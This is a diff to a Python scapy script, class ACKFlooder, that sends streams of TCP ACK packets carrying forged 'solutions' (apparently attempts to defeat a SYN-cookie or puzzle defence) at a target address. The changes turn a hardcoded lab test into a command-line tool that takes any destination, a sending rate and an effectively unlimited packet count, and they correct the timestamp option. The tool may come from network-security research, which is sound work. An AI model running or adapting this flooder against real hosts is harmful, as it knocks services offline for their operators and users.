@@ -2,6 +2,7 @@ from scapy.all import *
 import time
 import numpy as np
 import socket
+import argparse
 
 
 class ACKFlooder:
@@ -25,24 +26,25 @@ class ACKFlooder:
         self.w_scale = 7
         self.tsecr = 0
         self.curr_time = 0
+        self.max_packets = np.iinfo(np.int32).max
+        self.parser = self.prepareArguments()
 
-    def __init__(self, k, m, rate, dst):
-        self.k = k
-        self.m = m
-        self.num_sent_packets = 0
-        self.sending_rate = rate
-        self.destination = dst
-        self.dport = 80
-        self.interval = 10
-        self.mss = 1000
-        self.w_scale = 7
-        self.tsecr = 0
-        self.curr_time = 0
+    def prepareArguments(self):
+        parser = argparse.ArgumentParser(description="Send ack packets with bogus solutions in them.")
+        parser.add_argument('--rate', '-r', type=int, required=True,
+                            help="The rate at which to send the packets.")
+        parser.add_argument('--max_packets', '-c', type=int, default=-1,
+                            help="The maximum number of packets to send.")
+        parser.add_argument('--num_solutions', '-k', type=int, required=True,
+                            help="The number of solutions to prepare.")
+        parser.add_argument('--dst', '-d', type=str, required=True,
+                            help="The IP address of the destination to flood.")
+        return parser
 
     def sendPacket(self, ip, sequence_number, ack_number):
         # build up the packet's options
         tsval = time.time()
-        options = [('Timestamp', (self.tsecr, tsval))]
+        options = [('Timestamp', (tsval, self.tsecr))]
 
         # build the solution
         mss_flipped = socket.htons(self.mss)
@@ -64,7 +66,7 @@ class ACKFlooder:
                   seq=sequence_number + 1, ack=ack_number, options=options)
         send(ip/ack)
 
-    def startSending(self, maxPackets):
+    def startSending(self, maxPackets=-1):
         """
         Send a number of ACKS up to maxPackets
 
@@ -74,6 +76,10 @@ class ACKFlooder:
         start_time = 0
         sport = 0
         seq = np.random.randint(low=0, high=np.iinfo(np.int32).max)
+
+        if (maxPackets == -1):
+            maxPackets = self.max_packets
+
         while self.num_sent_packets < maxPackets:
             ip = IP(dst=self.destination)
 
@@ -104,7 +110,15 @@ class ACKFlooder:
             if self.sending_rate != 0:
                 time.sleep(1.0 / self.sending_rate)
 
+    def start(self):
+        args = self.parser.parse_args()
+        self.sending_rate = args.rate
+        self.k = args.num_solutions
+        self.destination = args.dst
+
+        self.startSending(args.max_packets)
+
 
 if __name__ == '__main__':
-    flooder = ACKFlooder(k=2, m=17, rate=0, dst='10.1.6.3')
-    flooder.startSending(2)
+    flooder = ACKFlooder()
+    flooder.start()
